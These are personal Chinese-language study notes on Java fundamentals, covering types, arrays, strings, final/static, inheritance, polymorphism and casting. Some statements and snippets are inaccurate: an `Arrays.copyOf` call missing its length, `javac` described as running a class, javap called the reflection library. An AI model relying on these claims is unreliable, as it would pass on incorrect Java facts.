6/27/2014 9:43:04 PM Preface
----------
Java se:桌面应用

Java ee：企业应用

Java me：移动应用

         javac                  java
Java源代码->二进制代码（平台无关）->linux(windows)机器码
         编译器                   JVM 

如果只运行`java`程序，安装`JRE`即可。如果编写`java`程序，那就还需要安装`JDK`。


    JRE=JVM+一些核心的库

实际安装中，其实`JDK`中本来就带有`JRE`，所以不用另外安装公共`JRE`。安装`JDK`即可。

`Java/Bin`目录：`java`提供的各种工具，如`javac` ，`javap`等

在安装`JDK`设置环境变量的时候。`Path`中加入的是`JDK`的`bin`目录路径。  
这个路径下面是各种`java`工具。系统会在这些路径下查找我们所需要的工具。这个路径是给`shell`使用的。

还有一个`classpath`路径，这个路径的作用：当我们使用使用`java`运行二进制文件的时候，如果没有指定二进制文件`(.class)`的绝对路径的时候，会去这个`classpath`中查找对应名字的文件。同样，在我们的源程序中`import`了`JDK`中的某一个类的时候，也是去`classpath`所指的目录中查找需要的编译后`.class`文件的。这里就要在`classpath`中加入`JDK`的`lib`路径。使用`JDK`中给我们写好编译好的各种类。  
这个路径是给`JVM`使用的。

`Java`中数据类型有：  
1. 基本数据类型：`int`、`double`等。  
2. 类型：数组/类/接口/枚举类型。

Java中基本数据类型
--------------
1. 整型：`int（4）`、`short（2）`、`long（8）`、`byte（1）`。表示整数。由于`JVM`的存在，使得在不同的机器平台上的`Java`程序的数据类型所占内存空间是一样大的。解决了移植性的问题。长整型数据后缀L。十六进制前缀0X，八进制前缀0。注：`Java`中没有无符号数。

2. 浮点数：`float（4）`与`double（8）`。表示小数。`float`数后缀F，没有后缀默认`double`，也可以后缀为D。注：很少使用`float`，都是使用`double`。

3. `char`类型：用于表示单个的字符。表示字符常量。“”与‘’是不同的，‘’里面的表示这是一个`char`字符，而“”表示这里面的是一个带有字符的字符串，即使只有一个字符也是字符串。二者是不同的。`\u`转义表示这是一个`Unicode`字符。最好不要使用`char`类型，而是使用抽象数据类型-字符串类型。这样有利于操作。

4. `boolean`类型：注：`Java`中数值0不能代表`false`，非0也不能代表`true`。

Java中的数组
-------
大数值：`java.math`包中有两个类`BigInterger`和`BigDecimal`来处理任意长度的数字序列。  
`Java`中没有提供运算符重载功能。

数组：
> 
	int[] a=new int[100];
	或者 int[] a=new int[]{1,2,3};

以下方法都需使用`java.util.*`包。这些都是针对数组这个结构的`static`方法。  
`Arrays`这个类：它的作用就是操作数组这个类型的工具类。里面都是各种`static`方法，针对于数组这个类型的。  
Arrays类中的方法：  
>
数组拷贝：  
1. 数组引用变量的拷贝，使两个数组变量指向同一个数组。  
2. 数组元素的拷贝，也就是制造两个数组。使用`Arrays.copyOf()`这个`static`方法。
>
	int[] b = new int[]{1,2,3};
	int[] a = Arrays.copyOf(b);//将b数组拷贝到a数组中。
>
数组排序：  
使用`Arrays.sort()`这个静态方法。这是一个快速排序法。
>
返回数组中数据元素的字符串形式：  
使用`Arrays.toString()`静态方法。
>
二分查找法：  
`Arrays.binarySearch()`静态方法。

二维数组：
>
	int[][] bal=new int[][]
	{
		{1,2,3},
		{4,5,6},
	};

遍历二维数组每一个元素：
>
	Arrays.deepToString()静态方法。

实际上对多维数组进行操作都要使用`deep`开头的方法。

实际上`Jav`a中没有多维数组，本质就是数组的数组。  
`bal`数组实际上包含两个元素的数组，每个元素由三个元素组成。`bal[1]`引用的是二维表的第i行。这一行本身就是一个数组。  
为每一行分配元素的时候：
>
	bal[2]=new int[3];将这一行当做一个元素。这样可以创建不规则数组。
>
	int[][] a=new int[10][];
	for( int n=0;n<10;n++)
	{
		a[n]=new int[n+1];
	}
或者直接：
>
	int[][] a=new int[][]{{1,2,3},{1},{2,3}};
这样创建的是一个三角形的不规则数组。不规则数组就是Java语言和其他语言的不同。

输出的时候:
>
	for (int m=0;m<a.length;m++)
		for (int k=0；k<a[m].length;k++)

这样即可遍历。

或者使用foreach:
>
	for (int[] row :a)
		for (int m:row)

这样亦可。

在java里面，数组也是一个和int、类这些东西同级的类型。他可以用于创建一个数组引用变量，也可以用于类型的转换，和所有的基本数据、类都是一模一样的。  
所有的数组都是在其他的类型后面加上[]即变为数组类型。如：  
`String[]`就是一个数组类型。`int[]`数组类型后面加上`[]`就变成了`int[][]`这个数组类型.  
数组类型变量本质就是引用类型，实际上就是指针。数组引用本来就是一个变量。

所以，写数组的时候必须写成：`int[]`,而不要是`int a[]`;  

`Java`语言是静态语言，就是说，一旦变量类型确定，就不能再修改，也就是说变量内存空间大小也不能修改了。那么`jav`a中数组的长度是不能改变的，一旦初始化完毕就恒定了。空间是固定下来的，即使元素被清空，其空间依旧保留，可以被别的元素占用。

数组类型变量只是一个指针，如果没有将它引用到一个数组对象，那么就不能直接使用这个数组变量。也就是说数组变量必须指向一个有效的内存，也就是必须进行**初始化**。  
初始化两种：
>
静态初始化：
>
	int[] a=new int[]{1,2,3};//这就是静态初始化，后一个[]里面不能设置长度，因为后面的{}里面已经确定数组长度了，是一个固定的长度了，也就是数组对象定义的时候就已经静态化它的长度了。指定了数组的元素，让系统判断数组长度。
动态初始化：
>
	int[] a=new int[3];//只指定数组的长度，不指定数组的元素。后面再进行数组元素的初始化。

总之，不能即指定数组长度又指定数组元素:
>
	int a=new int[3]{1,2,3};//这是错的。因为是没有必要的。

在数组初始化之后，每一个数组元素都可以作为基本数据变量或者引用类型变量使用。
数组的使用：  
1. 数组的`length`属性，返回数组长度。


Java中字符串类型
---------------
1、和`char`不同，这是字符串类型。不是`char`那样的基础数据类型。使用双引号。是一个类。而不是基础数据。
>
	String Str=“hello”；//这是一个字符串。
	char c=‘a’；//这是一个字符。

获得子串：`substring()`方法；
>
	String substr=Str.substring(1,3);//从字符串Str中取一个子串。

拼接：“+”；
  
`String`对象中的单个字符是不能修改的，也就是说，没有函数可以直接修改一个字符串中的某一个字符。  
如：  
`String Str="hello"；`  
修改为`"hellp"`的方法有两个：  
`Str="hellp";`或者`Str.substring(0,3)+"p";`而没有一个方法直接将最后一个字符进行修改。
这就是不可变字符串。
  
字符串相等比较，要使用`equals()`或者`equalsIgnoreCase()`而不是`==`  
因为：`equal()`是比较字符串是否一样的。而`==`是比较两个字符串在内存中的位置是否相等（也就是`String`对象的引用变量是否相等）。当两个字符串是一样的，但是位于内存的不同处，这样使用`==`判定就会是`false`。因为内存位置不同。  
如：
>
	String Str=“hello”；
	if（Str==“hello”）//比较的是Str这个字符串变量指向的字符串的位置是否与后面的“hello”字符串所在的内存位置是一样的。判断会失误。

误区：关于string缓存机制
>
	String s1=new string（“hello”）；
	String s2=new string （“hello”）；//s1！=s2；因为new创建了不同的对象，s1与s2指向不同的对象。
>
	String s3=“hello”；
	String s4=“hello”；//s3=s4；因为JVM有一个缓存机制，专门针对字符串，在第一个hello字符串的时候，即将这个字符串对象缓存起来，到s4的时候，不再创建新的字符串对象，而是使用s3的字符串对象。

同理：
>
	String s5=“hello”；
	String s6=“he”+“llo”；//s5=s6；因为JVM有一个缓存机制，专门针对字符串，在第一个hello字符串的时候，即将这个字符串对象缓存起来，到s6的时候，二者字符串一样。所以不再创建新的字符串对象，而是使用s5的字符串对象。

但是缓存只对于常量有用，也就是说，只会对`"hello"`这样的有缓存。对于`string s1="hello"`
这样的，下一次使用`s1`是不能使用缓存的，只有使用`"hello"`的时候才是使用上次的缓存。
>
	String s=“good”；
	String s2=s；//没有使用缓存；
	String s3=“good”;//使用了第一次的缓存。

注：使用缓存的意思就是：他们所指向的空间是一样的。

误区：关于`java`的宏替换
`final`修饰的变量会执行“宏替换”：
如果`final`修饰的变量在编译的时候就可以确定它的值（什么叫在编译的时候就知道它的值？  
Eg：String s=“hi”；这就是在编译的时候知道s的值。什么叫在运行的时候知道它的值？
Eg：String s1=“hi”；String s2=s1；那么，s1在编译的时候就知道它的值，而s2直到运行的时候才知道它的值。），那么，这个变量实际上是不存在的。而是在以后使用这个变量的时候直接执行“宏替换”。
这句话的意思就是：final修饰的变量如果赋予了初始值，而且这个初始值在编译的时候就已知，那么在内存中根本就不存在这个final变量，而只有它所指向的空间存在。以后使用的时候，是直接用这个初始值直接进行宏替换。
Eg：final string s3=“hello”；
　　String s4=s3;//这段代码中，变量s3并不存在，在s4语句中，需要用到s3，就是在编译到s4的时候直接执行宏替换，将“hello”置换到s4指向的空间中。也就是说，编译的时候，s4的值就已知（相当于直接在s3的位置放上“hello”）导致s4编译的时候就知道它的值。而且连“hello”这个对象也不存在，因为前面的引用变量s3已不存在了，所以再创建出对象也没有意义。
　　而在前例中，s2的值在编译的时候是未知的，直到运行的时候才知道。这就是final修饰的一个feature。
总之，如果final变量已初始化，且在编译的时候就知道其值，那么这个变量不存在了，变量所引用的对象也是不存在的。变量都不存在了其引用对象就没有存在的必要了。
Final成员变量定义时的赋值、初始化块中的赋值都不会插入到构造函数最前面，因为final成员变量在编译是已知其值，则该变量不存在。无final的一般成员变量都会插入到构造器中。
同理，static的final成员变量的定义时赋值也不会被插入到static初始化块中。无final的static的成员变量都会被插入到static初始化块中。

所谓的宏替换：就是查找、替换。

要注意：宏替换变量应该使用大写单词表示，且由多个单词连接而成，各个单词之间以下划线分隔。

>
	Final String s1=“hi”；
	Final String s2=“hello”；
	Final String s3=s1+s2；

这里创建了1个对象（“hihello”），但是只有0个变量，s1、s2、s3这3个变量不存在。因为是final的，且编译时值已知。
Java中变量
基本数据类型的变量：
int a=5；//这个5直接放置在a这个变量中，a就是基本类型变量。
引用变量：
引用变量中并不是放置着具体的内容数据，而是其引用的数据的地址。这就是引用变量。当然指针本身也是变量，放在栈中。指针所指向的内容放在堆中。

变量的声明，如，int a；double b；
变量声明之后，必须使用赋值语句进行初始化，编译器不会自己给它赋值的，这一点和C不同。没有自己初始化使用就会导致问题。Java中不区分变量的声明与定义。
Java中使用final声明常量。使用大写。且这个量只能被赋值一次。不能修改。
Java中如果要使一个常量可以被一个类中的所有方法共同使用，称之为类常量，这个量的大小不能修改，属于整个类。使用static final进行设置。
>
	static final int a=10；这个值被所有的对象所有的方法使用，且不能修改。

这个不同于单纯的static成员变量。这个static变量只是属于整个类。但是不能保证不变。

成员变量：在类中定义。
属于类的成员变量：static
属于对象的成员变量：无static
在某个方法中建立一个对象的时候，对象本身在堆中，对象的引用在栈中。
系统加载一个类，就为这个类开辟一块空间。只加载一次。
建立对象的时候，会为成员变量进行初始化。

局部变量：局部变量就是在方法中定义的变量，储存在方法栈中，必须由程序员进行初始化。不能用static进行修饰。局部变量不允许重名。
方法中的局部变量，作用域仅在方法中。
代码块中的局部变量，仅在代码块中有效。代码块：如，某个方法里面有一个括号，括号中内容就是一个代码块。代码块就是一个花括号。
形参：在整个方法中有效。

Java中没有所谓的全局变量的说法。


Java中的运算符
--------
数据的左右移位：>>与<<
在没有数据溢出的情况下，左移n位就是乘以2的n次方。右边空的地方补上0；
右移没有溢出问题。相当于右边去掉n位。右移n位就是在左边的空地方补上符号位，正数补上0，相当于除以2的n次方，然后舍去小数部分。负数就是补上1，相当于除以2的n次方，然后将小数部分补成整数。结果都比算术意义上的数小。
数字以最快的速度乘以8，就是左移3位即可。这就是提高效率的方法。

数据的无符号右移：>>>:无论数据的正负，右移都是在数据左边空地方补上0，一直补0；会将负数变为正数。


Java中基本数据之间的转换
-----
基本数据之间的转换不涉及向上或者向下造型。而是其单独独立的转换方法。
其中6个实心箭头，表示小空间向大空间转换，转换无信息丢失。3个虚箭头，表示可能有信息丢失。
基本数据类型之间的转换有两种:

一种是无信息丢失的转换，这种转换称为自动转换。例如：`int a=10；double b=a；`这样使用a这个int来初始化b这个double是一种类型自动转换。

第二种是有信息丢失的转换，这种转换称为强制转换。例如：`double a=10.58；int b=（int）a；`这样使用a这个double来初始化b这个int，由于是大空间向小空间的转换，所以需要使用强制类型的转换。当然会有空间精度的损失。截断小数部分(不是四舍五入）。

注，此处，如果想获得一个浮点数的四舍五入的结果，就使用`Math.round()`这个方法，获得的是一个long整型数据，如果要变成int型数据，这就需要强制类型转换。也就是`int b=(int)Math.round(a);`也会有精度丢失的问题。

Java中输入输出
-----------------
A、键盘输入：

输入使用`Scanner`类对象进行。涉及密码输入时使用`Console`类对象进行（不显示密码）
系统里，`System.in`代表键盘。如果直接使用这个会很麻烦，一般都会对其进行包装：
包装成`BufferedReader`，这个更安全，而且有更完善的异常机制。
JDK1.5之后，出现`Scanner`，这个更方便，但在异常机制上有不足。

>
	Scanner sr = new Scanner(System.in);//这样就将键盘这个对象包装成Scanner类对象。
	while(sr.hasNextLine())//判断是否还有下一行输入。同理还可以判断是否有下一个字符的输入
	{
		System.out.println(sr.nextLine());
	}

注：多线程最困难的地方就是：出错难以调试。因为线程调用是随机的。

B、屏幕输出：
>
	System.out.println（）方法即可输出。


文件输入与输出：

A、文件读入：
读取文件的时候，使用一个`file`对象构造出一个`Scanner`对象。
这样就将一个文件内的内容读入到内存中了。
>
	Scanner in=new Scanner（new file（“myfile.txt”））；

如果文件路径中有“\”，那么需要使用转义字符。
>
	Scanner in=new Scanner（new file（“C:\\myfile.txt”））；

这样才行。`in`这个输入流中就是这个文件中的内容。然后就可以使用`Scanner`这个类的方法对这个输入流进行读取了。

B、文件写入：
>
	PrintWriter out = new PrintWriter(“myfile.txt”);//将写入流对象与文件相连接。

定位文件时可使用绝对路径:
>
	C:\\myfile\\myfile.txt;或者/home/me/myfile.txt;

当然，流最后都需要关闭。
>	
	out.close（）；


注：输入流就相当于一个管子。管子本来是空的。实际上就是表示在内存中的内容。
输入流对象这个管子里面是什么需要内容与外界的输入进行连接，这个流对象在哪里显示需要与外界的显示输出连接起来。也就是说，一个流就是内存中的一块空间。需要在两端与外界连接。这才是流的特征，有来源有出口。

和控制台的输入相连接：
>
	Scanner in=new Scanner(System.in)；//这是将输入流对象in与系统控制台输入进行连接。
	Console inc=System.console();//这是将输入流对象inc与系统密码输入相连接。

与控制台的输出相连接：
>
	String name=in.nextLine();//将输入流对象与name这个输出的东西进行连接。	

任何一个输入、输出流对象都需要在两端进行连接，然后就可以使用。只不过流对象的功能不同。各种不同的流对象都是针对不同的两端的内容的。两端内容不同，使用不同的流对象。

Java中的块，一个变量的有效范围就是一个块。但是嵌套的块中，变量不会覆盖块外的变量，这一点和C++不同。



Java中的语句
-------

选择语句：
>
	if（）……else if（）……else……
多重选择：
>
	switch（）case1：……break；case2：……break；default：……；一般很少使用switch。

循环语句：
>
不确定循环：
>
	while（）……do……；do……while（）；
确定循环：
>
	for循环，for循环是支持迭代的通用结构。利用每次迭代之后更新的计数器或者类似的变量来控制迭代次数。

>
Foreach 循环：
>
	for（variable：collection）statement；

Java类之间的关系
-----------

1、依赖（use a）：一个类的方法中操作了另一个类的对象，这就是依赖的关系。例如类A的某个方法中使用了B类对象作为局部变量，这就是依赖。
应该将互相依赖的类减至最少。这就是使A类不知道B类的存在，意味着B类的改变不会导致A类产生bug。这样就是让类之间的耦合度减小。

2、聚合（has a）：一个类A中的成员变量包括B类对象，这就是聚合关系。也就是A类对象包含B类对象。

3、继承（is a）：A类由B类继承而来。特殊与一般的关系。包含B类中的方法。


Java中的引用
---------
java中的引用类似与C++中的指针。

一个java源程序中，只能有一个`public`类（也就是只能是`main`那个函数所在的类是`public`，其他的所有类都不能）。但可以有任意个非`public`类。


Java中的编译与文档生成、汇编
------------------------
java编译：  
java中可将各个类放在不同的源文件中，如:`test.java`与`testdrive.java`.
在编译的时候，如果一个java源文件中具有两个类，那么就会编译产生两个`.class`文件。
这样编译的时候，可以使用通配符：
>
	javac test*.java

这样所有的文件都被编译成`.class`文件。

编译`public`类文件:
>
	javac testdrive.java

这样编译器会先导入`testdrive`类，然后自动搜索需要的类，在编译的时候，会首先查找`test.class`文件，如果没有就会查找`test.java`文件并编译它。如果`.java`文件比`.class`文件新，就会重新编译`.java`文件。这就相当于java编译器内置了make工具。

相对路径：不以盘符开始的路径。不唯一的。所以要使用相对路径就需要在一个基础路径才可以。相对路径的基础路径就是当前路径，就是现在操作的路径。
绝对路径：以盘符开始的路径。唯一的确定的。

javac命令用于编译；
java命令用于运行；
javadoc命令用于从源文件中提取文档注释以生成**API**文档：
命令：
>
	javadoc -d 生成API放置目录路径 java源文件； 

然后去**API**文档目录中查看`index.html`文档即可。

javac将程序编译都一个文件夹中需要先自己创建一个文件夹。这个文件夹对应整个工程。里面的都是一个个程序编译出来的包（package），package放在这个自己创建的文件夹中(这个工程的文件夹）。

也可以不直接创建一个文件夹：而是编译时使用：
>
	javac -d .\ java源文件  // .\表示放在本目录下创建文件夹。文件夹中的包和源文件中的package层次相对应


但是javadoc提取**API**是不需要自己创建一个对应文件夹的，程序会自己创建一个。


javap 命令的使用：
>
	javap -c 类名：

java中的反射库：用于产生程序执行过程的汇编代码。

java的return
----------
访问器方法的`return`不能是可变变量的引用。  
因为返回可变变量的引用之后，就会导致以这个访问器方法做左值的时候，就会在类外修改了类的`private`成员变量的值。这就破坏了封装原则了。
那么访问器`return`的时候，应该返回可变变量的`clone()`才行。或者返回`final`变量。

java中final关键字
-----------------
1、`final`修饰变量（*成员变量*（类拥有变量与实例拥有变量）与局部变量（方法内局部变量与块内局部变量））  

`final`修饰符大部分用于基本数据类型，或者不可变类的域（类中的每一个方法都不改变该成员变量）。如果是用于一个类成员变量（也就是非基本数据类型成员变量），就会导致混乱，因为在一个类中使用`final`类成员变量，只说明这个类成员变量的引用是不变的，而不说明这个对象本身时不变的，只是引用不变而已。
所以`final`修饰符最好不要使用在非基本数据类型成员变量上。
`final`成员变量表示这个变量是不能被修改的。

A、`final`修饰成员变量
必须人工进行初始化，初始化的位置：
定义成员变量时、
初始化块（普通初始化块与`static`初始化块）、
构造函数。

普通方法不允许为`final`成员变量赋值。`final`成员变量只能在以上三个位置进行初始化且只能在一个地方赋值。因为他们前两个实际上都是插入到构造器中来发挥作用的，所以三者都是平等的地位。都可以对`final`成员进行初始化。

B、`final`修饰局部变量	
必须人工初始化，无论是否是`final`局部变量。
局部变量加了`final`之后，以后再也不能修改其值了。

要注意`final`变量的工作方式与普通变量是不同的，见java中字符串类型中说明的`final`变量的工作原理。

2、`final`修饰符用于类方法或者整个类，表示这个类或者方法不能被继承或重写了。  
非`final`类中可有非`final`方法和`final`方法，其中的非`final`方法可有被继承重写。但是`final`方法不能被重写。  
`final`类中所有的方法都是默认为`final`的，也就是说，`final`类中所有方法都不可被重写。但是不说明那些成员变量是`final`的（`final`成员变量表明成员变量不变）。
也就是说`final`成员变量可以设置为`public`，因为它已不能被修改了，为一常量。

Java中static关键字
-----------------
`static`就是一个标志，不是什么静态的意思。  
`static`成员变量和`static`成员方法还有`static`初始化块。与类共存亡。  
`static`成员变量属于整个类，所有对象共享。`static`成员变量可以在声明定义的时候即赋值，也可以在`static`代码块中进行赋初值，但是不能在构造函数中赋初值。  
如果是`final static`常量，能在成员常量定义的时候赋初值。也能等到在`static`初始化块里面赋初值。因为最终也是要插入到`static`初始化块的。    
`static`成员变量使用的较少。但是`static`成员常量用的较多，也就是`static final`成员常量。全类共享，且不变。  
`static`成员方法是不能对对象进行操作的，只能对类共享的成员变量进行操作。不需要对象，也就是`static`方法没有`this`这个隐藏参数。  
以下两种情况下需要使用`static`成员方法。  
1. 当这个方法不需要使用对象的状态的时候，也就是这个方法的所有的参数都是显式提供的，而不需要隐式提供的`this`。  
2. 这个方法只需要访问类的`static`成员变量，不需要访问非`static`成员变量。当有类但是没有创建对象的时候，可以通过类直接使用`static field`或者方法。

静态方法的还有一个用处就是：`Factory`方法。用于产生不同风格的格式对象。

在同一个类中：
`static`成员不能访问非`static`成员（包括成员变量与方法）。  
`this`、`super`都不能出现在`static`成员中（如，不能出现在`static`方法中）；
这里的`static`成员包括：`static`方法、`static`初始化块、`static field`但不包括构造器（也就是说，`static`成员可以调用所有的构造器，因为构造器根本就没有`static`修饰这回事儿）。
也就是说，`static`初始化块里面都不能出现属于实例的非`static`的东西。  
总之一句话，类拥有的东西不能碰对象拥有的东西，也就是说，抽象、集体的东西不能碰具体、个人的东西。但前提是：在同一个类中。
>
	Static main方法都不能访问同一个类中的非static field。
	Public class m
	{
		int a=10；
		Public static void main（String[] args）
		{
		System.out.println（a）;//这是错的，在同一个类中，本类的static成员不能访问本类的非static成员。
		}
	}
`static`的东西在导入这个类的时候即导入。是最先导入的。  
`main`方法也是一个`static`方法。
任何一个类都可以拥有它自己的main方法，这是常用的对类进行单元测试的技巧。
如果要单元测试这个类，可以直接`javac employee`即可。这样就会执行`employee`这个类的`main`方法。

Java中abstract关键字
------------------
`abstract`类：  
`abstract`类特点：有得有失  
得：可以拥有抽象方法。因为普通类中不能有抽象方法，只有抽象类中才可以有抽象方法。所以，一个类中有了抽象方法就一定是抽象类。  
失：不能创建实例。  
误区：  
1. 其他的和普通方法都是一样的。同样有各种`field`（`static`与非`static`），各种构造器，各种初始化块（`static`与非`static`的）。  
2. 抽象类可以没有抽象方法。但这种抽象类依旧不能创建实例。

但是，既然抽象类无法创建实例，那么，我们还需要抽象类的实例方法、变量（非`static`方法与非`static`成员变量）和构造器干什么？  
Answer：  
1、抽象类的构造器是用于供其子类调用以进行父类成员变量的初始化。  
2、抽象类的各种非`static`成员方法是用于被子类重写(`override`)。或者被子类直接调用(直接使用`super`即可)。非`static`成员方法中，抽象成员方法用于被子类重写。非抽象成员方法用于被子类调用（父类、子类都拥有这些方法）。

`abstract`方法:  
说明这个方法既不能被本类调用又不能被本类的实例调用，只是占了一个坑，留给子类来填。使用`abstract`修饰，且没有方法体。  
`abstract`不能与`final`同时出现：`abstract`表明必须继承重写，`final`表明不能重写,矛盾.  
`abstract`不能与`static`同时出现：`abstract`表明这个方法不能被类调用也不能被对象调用，必须被继承重写之后才可以被使用。而`static`表面这个方法可以被本类调用,矛盾。
`abstract`不能与`private`同时出现：`private`方法不能被覆盖（`private`无法被子类调用识别，更不用谈覆盖重写了）。`abstract`方法必须被覆盖。所以二者矛盾。  
`abstract`方法可能不能被子类重写。当子类在另外的包中的时候，就不能覆盖父类中`abstract`方法。因为没有明确写访问权限的时候，父类中`abstract`方法不能被位于不同包中的子类重写。



Java中传值
-----------
java方法传递值，都是按照值传递，也就是复制传递的。只有这一种方法。
只是复制传递过来的有两种：
基本数据类型、
对象的引用。
>
	int a=10；
	p.f（a）；
不管这个方法的具体实现。这样方法调用完之后，a的值依旧是10；因为只是一个复制拷贝被传递进来而已。

也就是说：一个方法不可能修改一个基本数据类型的参数。
但是，以一个对象引用作为参数就不同了，可以很方便得修改对象引用所对应的实际对象，不能修改这个对象的引用，但是可以通过对象引用来修改对象本身。

总之，记住，java方法传参只有一种，那就是通过复制传值，可能传递的是基本数据，也可能传递的是对象的引用变量。

Java中构造
------------------
构造器：
特殊的方法，无需返回值。
构造器的作用：并不是用于创建对象的，而是用于进行初始化的。创建对象是new的功能。
构造器的重载：完全类似于普通方法的重载。
如果构造函数中没有显式初始化成员变量，编译器就会自己给初始化，但是实际中程序员都要自己进行初始化。
但是方法中的局部变量和类成员变量是不同的，局部变量是不会被编译器给自动初始化的。所以，方法中的局部变量必须被显式初始化。
一个成员变量在被构造函数构造之前，也就是这个成员变量定义的时候，就可以赋初值，这种用法在希望该类的每一个对象都拥有相同这个成员变量值的时候可以使用。
Java，初始化时，先初始化成员变量的定义部分赋值，然后执行初始化块中的内容，再执行构造函数中的内容。 

当一个成员变量的初始化很复杂（例如，是一个对象，需要好几个语句进行初始化赋值，这时候，就不能使用成员变量时的初始化赋初值。只能在初始化块中或者构造函数中进行赋初值。对于`static`成员变量定义时赋初值或者`static`构造块，它们执行顺序与定义的顺序是一样，也就是说，如果`static`构造块在前面，`static`成员变量初始化赋值初始化在后面，那么在使用这个类的时候，即进行初始化。总之，所以`static`的东西在非`static`的东西之前进行初始化。是所有的都是如此。非`static`是在创建对象的时候才进行初始化。`static`的成员变量在创建对象之前就初始化了。因为他是属于整个类的东西。
类所在目录路径必须与类代码前面的包名相同，这是规定。 

Java中继承
-----------------
java中所以继承都是公有继承。 
 
尽管子类可以继承拥有父类中所有的成员变量与方法，但是，子类依旧不能使用父类中的私有成员变量与方法。只有父类才能访问他自己的私有成分。子类要使用父类的私有部分也只能通过父类中的`public`成员方法才行。`Super.f();`这样才行。 
 
在子类的构造函数中，C++中是通过构造列表来构造初始化父类中的成员变量的。而java中是通过在子类的构造函数中最先调用父类的构造函数来对父类中成员变量进行初始化`Super();`构造。
 
子类中可以增加成员变量，成员方法。还可以覆盖父类的方法， 但不能覆盖父类中的成员变量。

java中的继承：是单继承。但可以有n个间接父类。  
注：
java中的继承于现实中的继承是不同的。
现实中继承：对象与对象之间的关系。如：父亲与儿子的关系，这是对象之间的继承。  
java中的继承：类与类之间的关系。父亲与儿子之间的关系并不是java中所指的继承。  
java中的继承是：从一般到特殊的关系。是`“is-a”`的关系。就是扩展、延伸的意思。

子类继承父类：在父类中的5个部分中，子类可以获得父类所有的属性与方法（包括`private`的，但是不能在子类中访问，但确实是有），但是不能获得父类的构造器、初始化块、内部类等东西。


 
Java中数组与Arraylist的区别
---------------
>
	int［］ m＝new int［］；

> 或者
> 	
	Emploree[] staff=new Emploree[3];
    m［0］＝1； 
    m［1］＝2；//这样即设定了数组m的长度，即使数组元素可以修改，但是数组长度不能修改了。只能为2。 
 
`Arraylist`就是一个泛型类。类似与C++中的vector模板。
Java中的Arraylist就是所谓的动态数组。在定义这个对象的时候并未决定容器长度，长度可以动态改变。 
取数组中的元素使用[]即可，但是由于arraylist并没有像c++中vector那样重载[]，所以，要是使用显式方法get（）与set（）来获得、存取数据元素。  
同时要注意，数组的元素操作是通过工具类`Arrays`类来进行的.

这就是它们之间的区别。

Arraylist中元素访问不方便，而数组规模不能扩充。所以可以采用一个方式将二者的长处结合起来，这样就可以使得即能扩充规模，又能方便地访问数据。
这种方法就是：将数据储存于arraylist中之后，将这个arraylist转换为一个数组。这样就能达到目的。就是对arraylist对象调用toArray方法，就会产生一个数组对象。
这个arraylist就是一个数组列表，相当于vector。如果插入删除较多，就会导致效率下降，这时候就应该使用linklist数据，就是链表。这样有利于插入和删除。	

Arraylist对象都有注明存储类型。

Java中的多态
-------------
在C++中，如果要实现某个函数的多态进行动态绑定，就需要将相应的方法设为虚函数。
但是在Java中，要实现某个函数的多态动态绑定，不需要设为虚函数，Java中并没有特别指出虚函数，默认所有的函数都是虚函数。也就是说，任何函数都可以实现动态绑定实现多态，而不需特殊声明。这就是C++和Java中的区别。
当然，如果不想让这个方法实现多态动态绑定，可以将这个方法标为final的即可。这样，这个方法就不可以被重写，这样也就没有动态绑定的了。

另注意辨析Java中的final关键词，表示这个函数不能被重写。
Final类不能被继承了。Final类中所有方法都是final的。
Java中没有多重继承。Java中的置换法则，就是程序中任何的父类对象都可以使用子类对象进行置换。
如：employee e=new manager（）；employee这个父对象可以使用manager这个子类对象进行置换。

在Java中，默认对象变量是多态的，也就是说，一个父类变量既可以引用一个父类对象，也可以引用一个子类对象。如上文父类变量e既可以引用一个父类对象employee对象，也可以引用一个manager类对象。

重要的问题，动态绑定中，可以通过父类变量引用子类对象，多态引用之后，父类变量会自动使用子类中重写的方法，也就是说，如果子类重写了父类中的方法，那么会自动使用子类重写的那个方法。但是，如果某个方法在父类中是没有的而是在子类中新加入的，那么就不能使用父类变量来调用这个方法，而只能使用父类中已有的方法。也就是说，尽管有多态的存在，父类变量依旧只能使用父类中拥有的方法（子类中新加入的方法父类是不能使用的），子类对象才能使用他自己拥有的方法（包括子类中新加入的方法）。

注意：任何数组里面放的是类变量，而不是变量所引用的类对象。

Java中的方法签名：方法的名字和参数列表，但是函数的返回类型不是方法的签名。以前，在子类覆盖父类方法中，子类方法返回类型必须与父类相同，现在允许子类返回父类的子类类型。也就是说，manager类某一个覆盖父类的方法的返回值可以是manager类，也可以是employee类的。以前是必须保证manager覆盖的方法的返回值必须与父类的相同。现在可以返回父类子类类型。
当然，覆盖方法时，覆盖方法名字与参数列表是不能改变的，必须与父类的那个方法是一样的。

Private方法不能覆盖。Static也不用覆盖，final方法不能覆盖。这三种方法都是静态绑定。

多态实现的原理就是，虚拟机会搜索类变量实际类型的方法表，以确定实际上该使用哪个类的方法。然后即可以调用这个实际的方法了。这样就实现了动态绑定。

注意，final类中所有的方法默认是final的，但不说明成员变量是final的。
非final类中可以有final成员方法和非final成员方法。

将一个类或者方法设为final的原因在于：他们不会在子类中改变语义。

Java中类型转换
--------------------

关于类型转换的问题。
基础数据类型：
短空间向长空间转换：这样可以直接转换，因为不涉及精度损失：
int a=10；double b=a；//这样是没有问题的。
B、长空间向短空间的转换：
>
    double b=10.0；int a=b；//这里必须使用强制转换，因为涉及精度损失。会产生截断。

非基础数据类型。也就是类对象变量之间的转换。
他们涉及的是向上、向下造型。//manager继承自employee对象。
子类变量向父类变量的转变：这就是向上造型。
>
	Employee e=new manager（） ；这样就是向上造型。

B、父类变量向子类变量的转变：这是向下造型，需要类型强制转换。
>	
	Manager k=new manager（）；//这样建立一个子类变量k
    Employee e =k；//这样是向上造型，将子类对象转换为父类对象，这样可以实现多态，但是转换后的父类变量e并不能调用子类中独有的方法f（），只能调用父子类都有的方法。
	Manager m=（manager）e；//这样就是向下造型。类型强制转换。将向上造型获得的父类变量还原成他原来的类型。
	m.f（）;//这样可以通过向下造型获得的子类对象来调用子类独有的方法。`

但是这样的转换往往并不成功（这是因为这种向下造型只对于那些事通过向上造型获得的父类变量才有效，也就是说向下造型值能用于还原向上造型得到的父类变量，而不能转换任意的父类变量）。所以需要事先检查到底是都可以转换，也就是：
>
	if（e instanceof manager）
	{ 
		Manager m=（manager）e；
	}

